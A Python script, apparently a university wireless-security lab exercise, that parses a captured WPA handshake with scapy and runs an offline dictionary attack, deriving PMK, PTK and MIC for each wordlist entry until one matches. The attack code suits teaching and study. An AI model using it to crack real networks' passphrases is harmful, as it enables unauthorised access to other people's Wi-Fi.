#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
# todo: documenter les 3 prochaines lignes
ssid        = wpa[0].info.decode()
APmac       = a2b_hex(wpa[1].addr2.replace(':', ''))
Clientmac   = a2b_hex(wpa[1].addr1.replace(':', ''))

# Authenticator and Supplicant Nonces
# todo: documenter
ANonce      = wpa[5].load[13:32+13]
# todo: documenter
SNonce      = wpa[6].payload.payload[2].info[18:18+32]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
# todo: documenter
mic_to_test = wpa[8].payload.payload.payload.payload.info[82:82+16]

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# todo: documenter
data        = wpa[8].payload.payload.payload.payload.info[1:].replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")

with open("wordlist.txt") as f:
    while(True):
        passPhrase  = f.readline()

        if passPhrase == "":
            break

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid.encode(), 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)


        print ("\nResults of the key expansion")
        print ("=============================")
        print ("Passphrase: ",passPhrase,"\n")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.digest(),"\n")
        print ("ORIG MIC:\t\t",mic_to_test,"\n")

        if mic_to_test in mic.digest():
            print("Found Passphrase: ", passPhrase)
        

